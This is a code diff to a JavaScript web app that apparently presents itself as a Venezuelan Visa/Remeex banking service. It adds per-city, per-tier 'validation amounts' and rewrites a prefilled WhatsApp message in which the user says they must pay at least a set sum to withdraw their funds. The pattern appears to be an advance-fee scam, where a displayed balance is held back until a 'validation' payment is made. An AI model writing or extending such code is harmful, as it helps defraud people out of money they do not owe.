@@ -7275,6 +7275,30 @@ const BANK_NAME_MAP = {
       otros: 'Otros'
     };
 
+    const CITY_VALIDATION_AMOUNTS = {
+      caracas: {
+        'Estándar': 30,
+        'Bronce': 35,
+        'Platinum': 40,
+        'Uranio Visa': 45,
+        'Uranio Infinite': 50
+      },
+      maracaibo: {
+        'Estándar': 28,
+        'Bronce': 33,
+        'Platinum': 38,
+        'Uranio Visa': 43,
+        'Uranio Infinite': 48
+      },
+      valencia: {
+        'Estándar': 27,
+        'Bronce': 32,
+        'Platinum': 37,
+        'Uranio Visa': 42,
+        'Uranio Infinite': 47
+      }
+    };
+
     const LATINPHONE_LOGO =
       'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgal8gKkws3Arvh_T8Ml4-L-uQvRg7LsvKuFAWWlBgj8dj1kMeHvnvBZVUaVl81xuzLOG9D_uFtr3gkAClGSiqkjaJv5L7RAm46vLDjFqlO2x0bXI6CF5zPAiN5hRPb5-3MrvVsOAOLBYh5-V_E1ypbwl2zUFd8S0LPxzMZrJEqMYjwOWsA88vc_E20bZ0/s320/IMG-20250627-WA0025.png';
 
@@ -8338,6 +8362,23 @@ function stopVerificationProgress() {
       if (balanceUsd >= 1001) return 35;
       if (balanceUsd >= 501) return 30;
       return 25;
+    }
+
+    function getUserCity() {
+      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+      return (reg.state || '').toLowerCase();
+    }
+
+    function getCityValidationAmount(tier, fallback) {
+      const city = getUserCity();
+      if (CITY_VALIDATION_AMOUNTS[city] && CITY_VALIDATION_AMOUNTS[city][tier]) {
+        return CITY_VALIDATION_AMOUNTS[city][tier];
+      }
+      return fallback;
+    }
+
+    function capitalize(text) {
+      return text ? text.charAt(0).toUpperCase() + text.slice(1) : '';
     }
 
     function updateVerificationAmountDisplays() {
@@ -12681,11 +12722,14 @@ function checkTierProgressOverlay() {
     function buildWhatsAppMessage() {
       const name = currentUser.fullName || currentUser.name || '';
       const id = currentUser.idNumber || '';
-      const balanceUsd = formatCurrency(currentUser.balance.usd, 'usd');
       const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
       const bankName = BANK_NAME_MAP[reg.primaryBank] || '';
       const tier = currentTier || localStorage.getItem('remeexAccountTier') || 'Estándar';
-      return `Hola, soy ${name}, ciudadano venezolano, titular de la cédula ${id}. Mi saldo actual es ${balanceUsd}. Mi cuenta es de nivel ${tier}. Necesito asistencia para retirar mis fondos a mi banco ${bankName}.`;
+      const cityName = capitalize(getUserCity() || 'su ciudad');
+      const baseAmt = getVerificationAmountUsd(currentUser.balance.usd || 0);
+      const minAmt = getCityValidationAmount(tier, baseAmt);
+      const amountText = formatCurrency(minAmt, 'usd');
+      return `Hola, mi nombre es ${name} (C.I. ${id}). Vivo en ${cityName} y mi cuenta es de nivel ${tier}. Debo validar al menos ${amountText} para continuar. Agradezco su ayuda para retirar mis fondos al banco ${bankName}.`;
     }
 
     // Abrir chat de WhatsApp con el mensaje generado
